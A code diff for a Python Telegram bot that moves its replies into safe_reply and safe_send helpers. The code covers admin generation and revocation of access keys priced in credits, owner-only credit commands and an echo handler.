-    bot.reply_to(message, admin_text, parse_mode="HTML", reply_markup=keyboard)
+    safe_reply(message, admin_text)
+    safe_send(message.chat.id, "", reply_markup=keyboard)
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith("admin_"))
 @safe_handler
 def admin_callback(call):
+    chat_id = call.message.chat.id if call.message else call.from_user.id
     if call.data == "admin_genkey":
         bot.answer_callback_query(call.id, text="⏳ Please provide parameters...")
-        bot.send_message(call.message.chat.id if call.message else call.from_user.id,
-                         "Send parameters as: <code>validity max_users max_duration prefix</code>\nExample: <code>1day 10user 60duration MYKEY</code>",
-                         parse_mode="HTML")
+        safe_send(chat_id,
+                  "Send parameters as: <code>validity max_users max_duration prefix</code>\nExample: <code>1day 10user 60duration MYKEY</code>")
         bot.register_next_step_handler(call.message, admin_generate_key_step)
     elif call.data == "admin_listkeys":
         bot.answer_callback_query(call.id, text="⏳ Loading keys...")
         if not keys:
-            bot.send_message(call.message.chat.id if call.message else call.from_user.id,
-                             "<b>ℹ️ No keys generated.</b>", parse_mode="HTML")
+            safe_send(chat_id, "<b>ℹ️ No keys generated.</b>")
         else:
             reply = "<b>🔑 Generated Keys:</b>\n"
             for key_val, details in keys.items():
                 reply += (f"Key: <code>{key_val}</code>, Expires: {details['expires_at']}, "
                           f"Max Users: {details['max_users']}, Max Duration: {details['max_duration']} sec\n")
-            bot.send_message(call.message.chat.id if call.message else call.from_user.id,
-                             reply, parse_mode="HTML")
+            safe_send(chat_id, reply)
     elif call.data == "admin_revoke":
         bot.answer_callback_query(call.id, text="⏳ Awaiting key to revoke...")
-        bot.send_message(call.message.chat.id if call.message else call.from_user.id,
-                         "Send key to revoke as: <code>revoke KEY_VALUE</code>",
-                         parse_mode="HTML")
+        safe_send(chat_id, "Send key to revoke as: <code>revoke KEY_VALUE</code>")
         bot.register_next_step_handler(call.message, admin_revoke_key)
 
 def admin_generate_key_step(message):
     admin_id = message.from_user.id
-    # Expecting: validity max_users max_duration prefix
     params = message.text.split()
     if len(params) != 4:
-        bot.reply_to(message, "<b>❌ Incorrect format.</b> Send: validity max_users max_duration prefix", parse_mode="HTML")
+        safe_reply(message, "<b>❌ Incorrect format.</b> Send: validity max_users max_duration prefix")
         return
     validity_arg, max_users_arg, max_duration_arg, prefix_arg = params
     validity_lower = validity_arg.lower()
     try:
         number = int(''.join(filter(str.isdigit, validity_arg)))
     except Exception:
-        bot.reply_to(message, "<b>❌ Error parsing validity.</b> Include a number (e.g., '1day' or '15min').", parse_mode="HTML")
+        safe_reply(message, "<b>❌ Error parsing validity.</b> Include a number (e.g., '1day' or '15min').")
         return
 
     if "day" in validity_lower:
@@ -730,24 +674,22 @@ def admin_generate_key_step(message):
         validity_cost = (minutes + 14) // 15
         expiration = datetime.now() + timedelta(minutes=number)
     else:
-        bot.reply_to(message, "<b>❌ Invalid validity format.</b> Use 'day' or 'min'.", parse_mode="HTML")
+        safe_reply(message, "<b>❌ Invalid validity format.</b> Use 'day' or 'min'.")
         return
 
     try:
         max_users = int(''.join(filter(str.isdigit, max_users_arg)))
         max_duration = int(''.join(filter(str.isdigit, max_duration_arg)))
     except Exception:
-        bot.reply_to(message, "<b>❌ Error parsing max_users or max_duration.</b>", parse_mode="HTML")
+        safe_reply(message, "<b>❌ Error parsing max_users or max_duration.</b>")
         return
 
     users_cost = max_users
     duration_cost = (max_duration + 29) // 30
-
     total_cost = validity_cost + users_cost + duration_cost
-
     current_credits = get_credit_balance(admin_id)
     if current_credits < total_cost:
-        bot.reply_to(message, f"<b>🚫 Insufficient credits.</b> Cost is {total_cost}, you have {current_credits}.", parse_mode="HTML")
+        safe_reply(message, f"<b>🚫 Insufficient credits.</b> Cost is {total_cost}, you have {current_credits}.")
         return
 
     prefix = prefix_arg if prefix_arg.endswith('-') else prefix_arg + '-'
@@ -759,7 +701,7 @@ def admin_generate_key_step(message):
         "max_duration": max_duration,
         "used": []
     }
-    save_keys(keys)
+    save_keys_data()
     deduct_credit(admin_id, total_cost, reason="Key Generation")
     reply = (f"<b>✅ Key generated:</b> <code>{new_key}</code>\n"
              f"<b>Expires at:</b> {expiration}\n"
@@ -767,60 +709,60 @@ def admin_generate_key_step(message):
              f"<b>Max Duration:</b> {max_duration} sec\n"
              f"<b>Cost:</b> {total_cost} credits (Validity: {validity_cost}, Users: {users_cost}, Duration: {duration_cost})\n"
              f"<b>Remaining Credits:</b> {get_credit_balance(admin_id)}")
-    bot.reply_to(message, reply, parse_mode="HTML")
+    safe_reply(message, reply)
 
 def admin_revoke_key(message):
     parts = message.text.split()
     if len(parts) != 2 or parts[0].lower() != "revoke":
-        bot.reply_to(message, "<b>❌ Incorrect format.</b> Send: revoke KEY_VALUE", parse_mode="HTML")
+        safe_reply(message, "<b>❌ Incorrect format.</b> Send: revoke KEY_VALUE")
         return
     key_to_revoke = parts[1].strip()
     if key_to_revoke in keys:
         del keys[key_to_revoke]
-        save_keys(keys)
-        bot.reply_to(message, f"<b>✅ Key {key_to_revoke} revoked!</b>", parse_mode="HTML")
+        save_keys_data()
+        safe_reply(message, f"<b>✅ Key {key_to_revoke} revoked!</b>")
     else:
-        bot.reply_to(message, "<b>❌ Key not found.</b>", parse_mode="HTML")
+        safe_reply(message, "<b>❌ Key not found.</b>")
 
 # ---------------------------
-# Commands to Manage Credits
+# Credits Management Commands
 # ---------------------------
 @bot.message_handler(commands=['checkcredits'])
 @safe_handler
-def check_credits(message):
+def check_credits_handler(message):
     admin_id = message.from_user.id
     balance = get_credit_balance(admin_id)
     history = get_credit_history(admin_id)
     history_text = "\n".join([f"{item['timestamp']}: {item['type']} {item['amount']} ({item.get('reason','')})" for item in history])
     reply = (f"<b>💳 Your Credit Balance:</b> {balance}\n"
              f"<b>📝 Transaction History:</b>\n<pre>{history_text}</pre>")
-    bot.reply_to(message, reply, parse_mode="HTML")
+    safe_reply(message, reply)
 
 @bot.message_handler(commands=['addcredit'])
 @safe_handler
 def add_credit_command(message):
     if message.from_user.id != BOT_OWNER_ID:
-        bot.reply_to(message, "<b>🚫 Not authorized to add credits!</b>", parse_mode="HTML")
+        safe_reply(message, "<b>🚫 Not authorized to add credits!</b>")
         return
     command_parts = message.text.split()
     if len(command_parts) != 3:
-        bot.reply_to(message, "<b>❓ Usage:</b> /addcredit <admin_id> <amount>", parse_mode="HTML")
+        safe_reply(message, "<b>❓ Usage:</b> /addcredit &lt;admin_id&gt; &lt;amount&gt;")
         return
     target_id = command_parts[1]
     try:
         amount = int(command_parts[2])
     except ValueError:
-        bot.reply_to(message, "<b>❌ Error:</b> Amount must be an integer.", parse_mode="HTML")
+        safe_reply(message, "<b>❌ Error:</b> Amount must be an integer.")
         return
     add_credit(target_id, amount, reason="Manual credit addition")
-    bot.reply_to(message, f"<b>✅ Added {amount} credits to admin {target_id}.</b> New balance: {get_credit_balance(target_id)}", parse_mode="HTML")
+    safe_reply(message, f"<b>✅ Added {amount} credits to admin {target_id}.</b> New balance: {get_credit_balance(target_id)}")
 
 @bot.message_handler(func=lambda message: True)
 @safe_handler
 def echo_all(message):
-    if check_blocked(message):
+    if message.from_user.id in blocked_users:
         return
-    bot.reply_to(message, f"<b>{message.text}</b> 🤖", parse_mode="HTML")
+    safe_reply(message, f"<b>{message.text}</b> 🤖")
 
 # ---------------------------
 # Main Bot Loop with Watchdog
